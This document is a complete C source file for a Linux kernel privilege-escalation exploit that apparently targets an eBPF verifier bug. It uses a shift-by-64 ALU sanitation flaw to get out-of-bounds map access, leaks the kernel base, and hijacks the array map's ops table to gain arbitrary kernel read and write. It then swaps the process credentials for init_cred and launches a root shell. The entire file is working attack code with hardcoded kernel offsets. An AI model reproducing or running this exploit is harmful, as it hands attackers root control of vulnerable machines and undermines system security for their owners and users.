#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/bpf.h>
#include <sys/socket.h>
#include "bpf_insn.h"

#define ARRAY_MAP_OPS_OFFSET 0x10363a0
#define ARRAY_MAP_LOOKUP_ELEM_OFFSET 0x20e830
#define ARRAY_MAP_UPDATE_ELEM_OFFSET 0x20eeb0
#define PERCPU_OFFSET 0x149c900
#define current_task 0x17bc0
#define INIT_CRED_OFFSET 0x1a6b880
#define CRED_OFFSET 0xad8

int socks[2] = {-1};
int oob_map_fd, arb_read_write_map_fd, info_map_fd;

int bpf(int cmd, union bpf_attr *attr){
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

int bpf_prog_load(union bpf_attr *attr){
    return bpf(BPF_PROG_LOAD, attr);
}

int bpf_map_create(uint32_t key_size, uint32_t value_size, uint32_t max_entries){
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };

    return bpf(BPF_MAP_CREATE, &attr);
}

int bpf_map_update_elem(int map_fd, uint64_t key, uint64_t* value, uint64_t flags){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) value,
        .flags = flags
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

uint64_t bpf_map_lookup_elem(int map_fd, uint32_t key, int index){
    uint64_t value[0x150/8] = {};

    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) &value,
    };

    bpf(BPF_MAP_LOOKUP_ELEM, &attr);
    return value[index];
}

union bpf_attr* create_bpf_prog(struct bpf_insn *insns, unsigned int insn_cnt){
    union bpf_attr *attr = (union bpf_attr *) malloc(sizeof(union bpf_attr));

    attr->prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr->insn_cnt = insn_cnt;
    attr->insns = (uint64_t) insns;
    attr->license = (uint64_t)"";

    return attr;
}

uint64_t arb_read(uint64_t addr){
    int req = 0;

    bpf_map_update_elem(arb_read_write_map_fd, 0, &addr, BPF_ANY);

    write(socks[1], &req, sizeof(req));

    return bpf_map_lookup_elem(info_map_fd, 0, 0);
}

int arb_write(uint64_t addr, uint64_t val){
    int req = 1;

    bpf_map_update_elem(arb_read_write_map_fd, 0, &addr, BPF_ANY);
    bpf_map_update_elem(info_map_fd, 0, &val, BPF_ANY);

    write(socks[1], &req, sizeof(req));

    return bpf_map_lookup_elem(info_map_fd, 0, 0) == val;
}

int attach_socket(int prog_fd){
    if(socks[0] == -1 && socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0){
        perror("socketpair");
        exit(1);
    }
    
    if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0){
        perror("setsockopt");
        exit(1);
    }
}

void setup_bpf_prog(struct bpf_insn *insns, uint insncnt){
    union bpf_attr *prog = create_bpf_prog(insns, insncnt);
    int prog_fd = bpf_prog_load(prog);

    if(prog_fd < 0){
        perror("prog_load");
        exit(1);
    }

    attach_socket(prog_fd);
}

void run_bpf_prog(struct bpf_insn *insns, uint insncnt){
    int val = 0;

    setup_bpf_prog(insns, insncnt);
    write(socks[1], &val, sizeof(val));
}

int main(){
    uint64_t idx = 0;
    struct bpf_map_info map_info = {};

    oob_map_fd = bpf_map_create(4, 0x150, 1);
    arb_read_write_map_fd = bpf_map_create(4, 8, 1);
    info_map_fd = bpf_map_create(4, 8, 1);

    if(oob_map_fd < 0){
        perror("create_map");
        return 1;
    }

    struct bpf_insn kleak_prog[] = {
        // load map_ptr_or_null in BPF_REG_0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map)

        // map_ptr_or_null -> map_ptr
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // trigger vuln and make eBPF think we are still map_ptr + 0x110 but in reality we're map_ptr + 0x0
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        // ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), // the bug
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // load the ptr (kbase leak)
        
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0xc0), // map_ptr + 0x0 -> map_ptr + 0xc0
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), // load the ptr (heap leak)

        // write the read ptr to map for reading it from userspace
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x50), // make map_ptr + 0xc0 to map_ptr + 0x110
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // write array_map_ops ptr to maps_ptr + 0x110
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, 8), // write *(map_ptr + 0xc0) to maps_ptr + 0x118
        BPF_EXIT_INSN(),
    };

    run_bpf_prog(kleak_prog, sizeof(kleak_prog)/sizeof(kleak_prog[0]));

    uint64_t array_map_ops = bpf_map_lookup_elem(oob_map_fd, 0, 0);
    uint64_t map_ptr = bpf_map_lookup_elem(oob_map_fd, 0, 1) - 0xc0;
    uint64_t map_ptr_values = map_ptr + 0x110;
    uint64_t kbase = array_map_ops - ARRAY_MAP_OPS_OFFSET;
    uint64_t __per_cpu_offset = kbase + PERCPU_OFFSET;

    printf("array_map_ops: %p\nkbase: %p\nmap_ptr: %p\n", array_map_ops, kbase, map_ptr);

    struct bpf_insn overwrite_ops[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // setup fake bpf_map_ops struct with only needed values
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr + 0x110
        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_UPDATE_ELEM_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),

        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_LOOKUP_ELEM_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),

        BPF_MOV64_IMM(BPF_REG_0, kbase + 0x20e9c0), // array_of_map_gen_lookup
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8),

        BPF_MOV64_IMM(BPF_REG_0, kbase + 0x20eff0), // array_map_free
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // get values ptr

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // trigger vuln
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),

        BPF_LD_IMM64(BPF_REG_0, map_ptr_values),

        // overwrite map_ops with oob_map_ptr
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_EXIT_INSN(),
    };

    run_bpf_prog(overwrite_ops, sizeof(overwrite_ops)/sizeof(overwrite_ops[0]));

    struct bpf_insn arb_read_write[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // will use array_of_map_gen_lookup

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        BPF_LD_ABS(BPF_B, 0),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // decide bit for arb_read or arb_write

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, 1, 4),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // arb_read
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arb_write
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    setup_bpf_prog(arb_read_write, sizeof(arb_read_write)/sizeof(arb_read_write[0]));

    uint64_t current_task_struct = arb_read(arb_read(__per_cpu_offset) + current_task);
    uint64_t init_cred = kbase + INIT_CRED_OFFSET;

    arb_write(current_task_struct + CRED_OFFSET, init_cred);

    system("/bin/sh");
}